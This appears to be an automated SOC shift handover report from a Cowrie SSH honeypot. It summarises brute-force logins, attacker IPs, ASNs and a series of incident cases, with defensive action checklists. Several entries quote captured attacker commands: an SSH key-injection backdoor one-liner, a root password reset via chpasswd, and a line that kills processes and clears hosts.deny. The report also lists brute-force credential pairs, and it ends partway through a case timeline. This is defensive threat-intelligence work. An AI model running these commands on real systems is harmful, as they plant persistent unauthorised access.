# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T13:14:05Z |
| **Shift Time** | 13:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **62** |
| Confirmed Threats | **57** |
| False Positives Filtered | **5** (8.1%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **19** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **47** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **43** |
| Unique Credential Pairs | **28** |
| Unique Usernames | **15** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 7 |
| `admin` | 5 |
| `guest` | 3 |
| `Unknown` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `` | 4 |
| `Password` | 1 |
| `123456789` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `` | 4 |
| `Unknown` | `Password` | 1 |
| `Nobody` | `123456789` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qq520520` | `103.144.28.85` | 2026-03-31T11:18:43 |
| `root` | `3245gs5662d34` | `103.144.28.85` | 2026-03-31T11:18:49 |
| `root` | `jia123456` | `62.173.38.229` | 2026-03-31T11:50:09 |
| `root` | `3245gs5662d34` | `62.173.38.229` | 2026-03-31T11:50:15 |
| `root` | `cnc.c0for123` | `165.154.6.104` | 2026-03-31T11:54:41 |
| `root` | `3245gs5662d34` | `165.154.6.104` | 2026-03-31T11:54:44 |
| `root` | `yuanyuan` | `172.190.142.151` | 2026-03-31T11:56:23 |
| `root` | `3245gs5662d34` | `172.190.142.151` | 2026-03-31T11:56:28 |
| `root` | `Test123!@#` | `43.155.40.91` | 2026-03-31T12:12:01 |
| `root` | `3245gs5662d34` | `43.155.40.91` | 2026-03-31T12:12:05 |
| `root` | `root5` | `223.233.80.81` | 2026-03-31T12:31:09 |
| `root` | `3245gs5662d34` | `223.233.80.81` | 2026-03-31T12:31:11 |
| `root` | `100202400` | `34.81.72.185` | 2026-03-31T12:32:25 |
| `root` | `3245gs5662d34` | `34.81.72.185` | 2026-03-31T12:32:28 |
| `root` | `qazwsxedcrfvtgbyhnujmik,ol.p;/` | `183.56.241.96` | 2026-03-31T12:53:19 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:LmeBMRCSrrjn"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.56.241.96`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `62.173.38.229`, `223.233.80.81`, `165.154.6.104`, `103.144.28.85`, `172.190.142.151`, `34.81.72.185`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **38** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | MEDIUM |
| `AS135089` | China Telecom | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e03e7147103d

| Field | Detail |
|---|---|
| **Source IP** | `103.144.28[.]85` |
| **First Seen** | 2026-03-31 11:18 |
| **Last Seen** | 2026-03-31 11:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:18:42` | `cowrie.session.connect` |
| `2026-03-31 11:18:42` | `cowrie.client.version` |
| `2026-03-31 11:18:42` | `cowrie.client.kex` |
| `2026-03-31 11:18:43` | `cowrie.login.success` |
| `2026-03-31 11:18:43` | `cowrie.session.params` |
| `2026-03-31 11:18:43` | `cowrie.command.input` |
| `2026-03-31 11:18:43` | `cowrie.command.failed` |
| `2026-03-31 11:18:44` | `cowrie.log.closed` |
| `2026-03-31 11:18:44` | `cowrie.session.params` |
| `2026-03-31 11:18:44` | `cowrie.command.input` |
| `2026-03-31 11:18:45` | `cowrie.session.file_download` |
| `2026-03-31 11:18:45` | `cowrie.log.closed` |
| `2026-03-31 11:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.144.28[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.144.28[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e63afa9f6d

| Field | Detail |
|---|---|
| **Source IP** | `103.144.28[.]85` |
| **First Seen** | 2026-03-31 11:18 |
| **Last Seen** | 2026-03-31 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:18:48` | `cowrie.session.connect` |
| `2026-03-31 11:18:48` | `cowrie.client.version` |
| `2026-03-31 11:18:48` | `cowrie.client.kex` |
| `2026-03-31 11:18:49` | `cowrie.login.success` |
| `2026-03-31 11:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.144.28[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.144.28[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2751bac49427

| Field | Detail |
|---|---|
| **Source IP** | `62.173.38[.]229` |
| **First Seen** | 2026-03-31 11:50 |
| **Last Seen** | 2026-03-31 11:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:50:08` | `cowrie.session.connect` |
| `2026-03-31 11:50:08` | `cowrie.client.version` |
| `2026-03-31 11:50:08` | `cowrie.client.kex` |
| `2026-03-31 11:50:09` | `cowrie.login.success` |
| `2026-03-31 11:50:10` | `cowrie.session.params` |
| `2026-03-31 11:50:10` | `cowrie.command.input` |
| `2026-03-31 11:50:10` | `cowrie.command.failed` |
| `2026-03-31 11:50:10` | `cowrie.log.closed` |
| `2026-03-31 11:50:10` | `cowrie.session.params` |
| `2026-03-31 11:50:10` | `cowrie.command.input` |
| `2026-03-31 11:50:11` | `cowrie.session.file_download` |
| `2026-03-31 11:50:11` | `cowrie.log.closed` |
| `2026-03-31 11:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.173.38[.]229` to AbuseIPDB if not already reported
- [ ] Block `62.173.38[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75503d41eb7

| Field | Detail |
|---|---|
| **Source IP** | `62.173.38[.]229` |
| **First Seen** | 2026-03-31 11:50 |
| **Last Seen** | 2026-03-31 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:50:13` | `cowrie.session.connect` |
| `2026-03-31 11:50:13` | `cowrie.client.version` |
| `2026-03-31 11:50:14` | `cowrie.client.kex` |
| `2026-03-31 11:50:15` | `cowrie.login.success` |
| `2026-03-31 11:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.173.38[.]229` to AbuseIPDB if not already reported
- [ ] Block `62.173.38[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc8457eaf9e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-03-31 11:54 |
| **Last Seen** | 2026-03-31 11:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:54:41` | `cowrie.session.connect` |
| `2026-03-31 11:54:41` | `cowrie.client.version` |
| `2026-03-31 11:54:41` | `cowrie.client.kex` |
| `2026-03-31 11:54:41` | `cowrie.login.success` |
| `2026-03-31 11:54:41` | `cowrie.session.params` |
| `2026-03-31 11:54:41` | `cowrie.command.input` |
| `2026-03-31 11:54:41` | `cowrie.command.failed` |
| `2026-03-31 11:54:41` | `cowrie.log.closed` |
| `2026-03-31 11:54:42` | `cowrie.session.params` |
| `2026-03-31 11:54:42` | `cowrie.command.input` |
| `2026-03-31 11:54:42` | `cowrie.session.file_download` |
| `2026-03-31 11:54:42` | `cowrie.log.closed` |
| `2026-03-31 11:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d324a5e38775

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-03-31 11:54 |
| **Last Seen** | 2026-03-31 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:54:44` | `cowrie.session.connect` |
| `2026-03-31 11:54:44` | `cowrie.client.version` |
| `2026-03-31 11:54:44` | `cowrie.client.kex` |
| `2026-03-31 11:54:44` | `cowrie.login.success` |
| `2026-03-31 11:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4438abe50eb

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-03-31 11:56 |
| **Last Seen** | 2026-03-31 11:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:56:22` | `cowrie.session.connect` |
| `2026-03-31 11:56:22` | `cowrie.client.version` |
| `2026-03-31 11:56:22` | `cowrie.client.kex` |
| `2026-03-31 11:56:23` | `cowrie.login.success` |
| `2026-03-31 11:56:23` | `cowrie.session.params` |
| `2026-03-31 11:56:23` | `cowrie.command.input` |
| `2026-03-31 11:56:23` | `cowrie.command.failed` |
| `2026-03-31 11:56:24` | `cowrie.log.closed` |
| `2026-03-31 11:56:24` | `cowrie.session.params` |
| `2026-03-31 11:56:24` | `cowrie.command.input` |
| `2026-03-31 11:56:24` | `cowrie.session.file_download` |
| `2026-03-31 11:56:24` | `cowrie.log.closed` |
| `2026-03-31 11:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f1c4162474

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-03-31 11:56 |
| **Last Seen** | 2026-03-31 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 11:56:27` | `cowrie.session.connect` |
| `2026-03-31 11:56:27` | `cowrie.client.version` |
| `2026-03-31 11:56:27` | `cowrie.client.kex` |
| `2026-03-31 11:56:28` | `cowrie.login.success` |
| `2026-03-31 11:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d16d1738fc08

| Field | Detail |
|---|---|
| **Source IP** | `43.155.40[.]91` |
| **First Seen** | 2026-03-31 12:12 |
| **Last Seen** | 2026-03-31 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:12:01` | `cowrie.session.connect` |
| `2026-03-31 12:12:01` | `cowrie.client.version` |
| `2026-03-31 12:12:01` | `cowrie.client.kex` |
| `2026-03-31 12:12:01` | `cowrie.login.success` |
| `2026-03-31 12:12:02` | `cowrie.session.params` |
| `2026-03-31 12:12:02` | `cowrie.command.input` |
| `2026-03-31 12:12:02` | `cowrie.command.failed` |
| `2026-03-31 12:12:02` | `cowrie.log.closed` |
| `2026-03-31 12:12:02` | `cowrie.session.params` |
| `2026-03-31 12:12:02` | `cowrie.command.input` |
| `2026-03-31 12:12:02` | `cowrie.session.file_download` |
| `2026-03-31 12:12:02` | `cowrie.log.closed` |
| `2026-03-31 12:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.40[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.155.40[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6f260ad76e

| Field | Detail |
|---|---|
| **Source IP** | `43.155.40[.]91` |
| **First Seen** | 2026-03-31 12:12 |
| **Last Seen** | 2026-03-31 12:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:12:04` | `cowrie.session.connect` |
| `2026-03-31 12:12:04` | `cowrie.client.version` |
| `2026-03-31 12:12:05` | `cowrie.client.kex` |
| `2026-03-31 12:12:05` | `cowrie.login.success` |
| `2026-03-31 12:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.40[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.155.40[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb5c276b994

| Field | Detail |
|---|---|
| **Source IP** | `223.233.80[.]81` |
| **First Seen** | 2026-03-31 12:31 |
| **Last Seen** | 2026-03-31 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:31:09` | `cowrie.session.connect` |
| `2026-03-31 12:31:09` | `cowrie.client.version` |
| `2026-03-31 12:31:09` | `cowrie.client.kex` |
| `2026-03-31 12:31:09` | `cowrie.login.success` |
| `2026-03-31 12:31:09` | `cowrie.session.params` |
| `2026-03-31 12:31:09` | `cowrie.command.input` |
| `2026-03-31 12:31:09` | `cowrie.command.failed` |
| `2026-03-31 12:31:09` | `cowrie.log.closed` |
| `2026-03-31 12:31:09` | `cowrie.session.params` |
| `2026-03-31 12:31:09` | `cowrie.command.input` |
| `2026-03-31 12:31:09` | `cowrie.session.file_download` |
| `2026-03-31 12:31:09` | `cowrie.log.closed` |
| `2026-03-31 12:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.80[.]81` to AbuseIPDB if not already reported
- [ ] Block `223.233.80[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5eb08bcf47

| Field | Detail |
|---|---|
| **Source IP** | `223.233.80[.]81` |
| **First Seen** | 2026-03-31 12:31 |
| **Last Seen** | 2026-03-31 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:31:11` | `cowrie.session.connect` |
| `2026-03-31 12:31:11` | `cowrie.client.version` |
| `2026-03-31 12:31:11` | `cowrie.client.kex` |
| `2026-03-31 12:31:11` | `cowrie.login.success` |
| `2026-03-31 12:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.80[.]81` to AbuseIPDB if not already reported
- [ ] Block `223.233.80[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb4df8925b7

| Field | Detail |
|---|---|
| **Source IP** | `34.81.72[.]185` |
| **First Seen** | 2026-03-31 12:32 |
| **Last Seen** | 2026-03-31 12:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:32:24` | `cowrie.session.connect` |
| `2026-03-31 12:32:24` | `cowrie.client.version` |
| `2026-03-31 12:32:24` | `cowrie.client.kex` |
